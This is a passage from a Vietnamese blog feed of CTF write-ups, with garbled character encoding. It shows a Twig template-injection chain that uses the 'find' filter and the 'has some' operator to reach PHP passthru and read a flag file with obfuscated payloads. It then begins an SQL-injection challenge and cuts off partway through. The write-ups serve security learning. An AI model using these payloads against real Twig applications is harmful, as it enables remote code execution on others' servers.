&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="p"&gt;[,&lt;/span&gt; &lt;span class="ne"&gt;int&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;$&lt;/span&gt;&lt;span class="n"&gt;return_var&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;passthru&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="p"&gt;[,&lt;/span&gt; &lt;span class="ne"&gt;int&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;$&lt;/span&gt;&lt;span class="n"&gt;return_var&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;exec&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="p"&gt;[,&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;$&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="p"&gt;[,&lt;/span&gt; &lt;span class="ne"&gt;int&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;$&lt;/span&gt;&lt;span class="n"&gt;return_var&lt;/span&gt; &lt;span class="p"&gt;]]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;shell_exec&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tá»« Ä‘Ã³, ta sáº½ truyá»n vÃ o $array giÃ¡ trá»‹ lÃ  system hoáº·c passthru, vÃ  truyá»n vÃ o ná»™i dung máº£ng lÃ  cÃ¢u lá»‡nh cáº§n thá»±c hiá»‡n. Khi Ä‘Ã³ sáº½ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i viá»‡c thá»±c thi PHP Code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;system($command, 0)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;passthru($command, 0)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Äá»ƒ test thÃ¬ táº¡m thá»i mÃ¬nh comment láº¡i Ä‘oáº¡n check blacklist Ä‘á»ƒ run cho tiá»‡n:
&lt;img src="https://hackmd.io/_uploads/SkB-05E3A.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h4 id="has-some"&gt;has some
&lt;/h4&gt;&lt;p&gt;NgoÃ i filter &lt;code&gt;find&lt;/code&gt; ra, mÃ¬nh Ä‘i lÆ°á»£n github thÃ¬ cÃ³ ngÆ°á»i cÃ²n tÃ¬m Ä‘Æ°á»£c operator &lt;code&gt;has some&lt;/code&gt; cÅ©ng cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ RCE, vá»›i nguyÃªn lÃ½ cÅ©ng tÆ°Æ¡ng tá»± &lt;code&gt;find&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public function getOperators(): array
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;has some&amp;#39; =&amp;gt; [&amp;#39;precedence&amp;#39; =&amp;gt; 20, &amp;#39;class&amp;#39; =&amp;gt; HasSomeBinary::class, &amp;#39;associativity&amp;#39; =&amp;gt; ExpressionParser::OPERATOR_LEFT],
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; * @internal
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public static function arraySome(Environment $env, $array, $arrow)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; self::checkArrowInSandbox($env, $arrow, &amp;#39;has some&amp;#39;, &amp;#39;operator&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; foreach ($array as $k =&amp;gt; $v) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if ($arrow($v, $k)) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return true;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return false;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Ta váº«n cÃ³ thá»ƒ truyá»n vÃ o má»™t máº£ng vÃ  tÃªn hÃ m tÃ¹y Ã½, náº¿u nhÆ° hÃ m Ä‘Ã³ xá»­ lÃ½ Ä‘Æ°á»£c sáº½ tráº£ vá» true, cÃ²n khÃ´ng tráº£ vá» false.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ÄÃ¢y lÃ  operator nÃªn ta khÃ´ng cáº§n sá»­ dá»¥ng dáº¥u &lt;code&gt;|&lt;/code&gt; Ä‘á»ƒ apply filter mÃ  cÃ³ thá»ƒ viáº¿t tháº³ng nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{{[&amp;#34;id&amp;#34;] has some &amp;#34;passthru&amp;#34;}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/Sy4LksN2C.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ¡ch nÃ y khÃ¡ lá»d vÃ  cÃ³ láº½ mÃ¬nh sáº½ sá»­ dá»¥ng trong má»™t ctf challenge nÃ o Ä‘Ã³ =)))&lt;/p&gt;
&lt;h2 id="final-payload--exploit"&gt;Final Payload &amp;amp; Exploit
&lt;/h2&gt;&lt;p&gt;Tá»•ng há»£p láº¡i Ä‘á»ƒ khai thÃ¡c, Ä‘áº§u tiÃªn mÃ¬nh craft payload &lt;code&gt;ls /&lt;/code&gt; Ä‘á»ƒ Ä‘á»c flag trÆ°á»›c Ä‘Ã£, mÃ¬nh sá»­ dá»¥ng passthru thay cho system vÃ¬ Ä‘á»¡ pháº£i ná»‘i chuá»—i 3 phÃ¡t=))&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set ls = dump({ls})|slice(15,2) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set hyphen = _charset|slice(3,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set space = dump()|slice(8,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set cmd = ls~space~slash %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{{ {cmd}|find(pass) }}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MÃ¬nh cÃ³ Ä‘Æ°á»£c tÃªn flag lÃ : &lt;code&gt;flag-efbeeaddce&lt;/code&gt;
&lt;img src="https://hackmd.io/_uploads/rknefsE20.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Giá» thÃ¬ craft cÃ¢u lá»‡nh Ä‘á»c flag thÃ´i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set cat = dump({cat})|slice(15,3) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set hyphen = _charset|slice(3,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set space = dump()|slice(8,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set flag = dump({flag})|slice(15,4)~hyphen~dump({efbeeaddce})|slice(15,10) %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set cmd = cat~space~slash~flag %}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{{ {cmd}|find(pass) }}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/Sy-Tzi4h0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
TrÃªn server thÃ¬ flag cÃ³ tÃªn: &lt;code&gt;flag-edbfcbcaef&lt;/code&gt;
&lt;img src="https://hackmd.io/_uploads/HyvNmsN2A.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/SykPmoNnC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Flag: &lt;strong&gt;CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>KMACTF 2024 write up</title><link>https://kev1n1203.github.io/p/kma-ctf-2024/</link><pubDate>Sun, 25 Aug 2024 17:59:27 +0000</pubDate><guid>https://kev1n1203.github.io/p/kma-ctf-2024/</guid><description>&lt;h2 id="pickleball"&gt;pickleball
&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rynYQTui0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL: &lt;a class="link" href="http://157.15.86.73:8888" target="_blank" rel="noopener"
&gt;157.15.86.73:8888&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Challenge chia flag thÃ nh 3 pháº§n vÃ  giáº¥u chÃºng vÃ o trang web, mÃ¬nh dirsearch vÃ  tÃ¬m kiáº¿m trong request burp 1 lÃºc thÃ¬ tÃ¬m Ä‘Æ°á»£c:
Part 1 náº±m á»Ÿ /robots.txt
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SyXuk5OoA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Part 2 náº±m táº¡i file js
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1KYy9_sC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Part 3 á»Ÿ file css
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S1yi15OiA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Flag: &lt;strong&gt;KMACTF{p1Ckleb4ll_WitH-uU_piCklepal_5a6b89113abb}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="malicip"&gt;malicip
&lt;/h2&gt;&lt;h3 id="preface"&gt;Preface
&lt;/h3&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJ94UpdsC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL: &lt;a class="link" href="http://157.15.86.73:18000" target="_blank" rel="noopener"
&gt;157.15.86.73:18000&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="source-code"&gt;Source Code
&lt;/h3&gt;&lt;p&gt;Táº¡i schema.sql mÃ¬nh tháº¥y flag Ä‘Æ°á»£c Ä‘Æ°a vÃ o báº£ng giáº¥u tÃªn REDACTED_TABLE vÃ  cá»™t giáº¥u tÃªn REDACTED_COLUMN, gá»£i Ã½ Ä‘á»ƒ solve challenge cáº§n dump database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-mysql" data-lang="mysql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;TABLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;REDACTED_TABLE&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;REDACTED_COLUMN&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;varchar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NOT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;NULL&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;REDACTED_TABLE&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;REDACTED_COLUMN&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;KMA{redacted, of course}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;NgoÃ i file app.py xá»­ lÃ½ 3 route cá»§a trang web, file config khÃ´ng cÃ³ cáº¥u hÃ¬nh gÃ¬ Ä‘áº·c biá»‡t nÃªn mÃ¬nh táº­p trung Ä‘i vÃ o Ä‘á»c file app.py. Äiá»u Ä‘áº·c biá»‡t Ä‘áº­p vÃ o máº¯t mÃ¬nh lÃ  route &lt;code&gt;check-ip&lt;/code&gt; Ä‘Æ°á»£c truyá»n vÃ o tham sá»‘ URL ip dÃ­nh SQL Injection:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@app.get(&amp;#34;/check-ip&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def check_ip():
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ip = request.args.get(&amp;#39;ip&amp;#39;, None, ip_address)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if ip is not None:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; result = query_db(f&amp;#34;SELECT ip, message FROM malicious_ip WHERE ip = &amp;#39;{ip}&amp;#39;&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return jsonify(
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [{&amp;#34;ip&amp;#34;: ip, &amp;#34;message&amp;#34;: message} for ip, message in result]
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; else:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return &amp;#34;invalid IP, now your IP seems suspicious&amp;#34;, 400
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Tham sá»‘ &lt;code&gt;ip&lt;/code&gt; náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n vÃ o sáº½ máº·c Ä‘á»‹nh lÃ  null, cÃ²n khÃ´ng thÃ¬ Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ m ipaddress.ip_address() Ä‘á»ƒ validate xem Ä‘Ã¢y cÃ³ pháº£i lÃ  má»™t IP há»£p lá»‡ hay khÃ´ng.&lt;/li&gt;
&lt;li&gt;Náº¿u &lt;code&gt;ip&lt;/code&gt; thá»a mÃ£n sau khi hÃ m check ip_address thÃ¬ sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o cÃ¢u lá»‡nh SQL dÃ­nh SQLi, cÃ²n khÃ´ng tráº£ vá» status 400&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Má»¥c Ä‘Ã­ch cá»§a challenge Ä‘Ã£ khÃ¡ rÃµ rÃ ng, viá»‡c mÃ¬nh cáº§n lÃ m lÃ  truyá»n vÃ o IP thá»a mÃ£n hÃ m ipaddress.ip_address(), Ä‘á»“ng thá»i váº«n pháº£i exploit SQL Injection.
Äiá»u nÃ y khÃ´ng dá»… tÃ­ nÃ o khi hÃ m nÃ y check khÃ¡ cháº·t, thÃªm 1 dáº¥u nhÃ¡y hÃ m sáº½ tráº£ vá» exception ngay:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1D3c6uj0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh máº¥t kha khÃ¡ thá»i gian cho viá»‡c chÃ¨n vÃ o Ä‘Æ°á»£c má»™t Ä‘á»‹a chá»‰ IP há»£p lá»‡ mÃ  chá»©a Ä‘Æ°á»£c cáº£ dáº¥u nhÃ¡y Ä‘Æ¡n. Äi tÃ¬m kiáº¿m cÃ¡c vuln cá»§a thÆ° viá»‡n nhÆ°ng cÅ©ng khÃ´ng cÃ³ gÃ¬ sá»­ dá»¥ng Ä‘Æ°á»£c cáº£
Äá»c láº¡i source code, tá»± nhiÃªn mÃ¬nh tháº¥y Ä‘á»‹a chá»‰ IPv6 Ä‘Æ°á»£c insert hÃ ng cuá»‘i khÃ¡ thÃº vá»‹, vÃ¬ nÃ³ váº«n cÃ³ thá»ƒ chá»©a cÃ¡c kÃ½ tá»±, mÃ¬nh tiáº¿p fuzzing tiáº¿p má»™t sá»‘ Ä‘á»‹a chá»‰ IPv6 nhÆ° &lt;code&gt;abcd::dead:beef:abcd&lt;/code&gt;, nhÆ°ng váº«n chÆ°a thá»ƒ chÃ¨n Ä‘Æ°á»£c dáº¥u nhÃ¡y vÃ o vÃ¬ chá»‰ cÃ³ thá»ƒ chÃ¨n vÃ o cÃ¡c kÃ½ tá»± biá»ƒu diá»…n hex mÃ  thÃ´i&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
